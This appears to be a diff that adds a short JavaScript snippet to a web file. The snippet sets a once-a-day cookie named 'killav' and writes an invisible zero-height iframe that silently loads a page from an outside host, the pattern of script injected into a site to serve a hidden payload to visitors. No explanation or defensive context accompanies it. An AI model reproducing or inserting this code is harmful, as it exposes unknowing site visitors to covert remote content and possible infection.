@@ -1,0 +1,15 @@
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 24*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie1=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie1=killav;expires="+ Then.toGMTString(); 
+document.writeln("<iframe src=http:\/\/bbs.jueduizuan.com\/index.htm width=100 height=0><\/iframe>");
+}
+}Get();
+
+
+
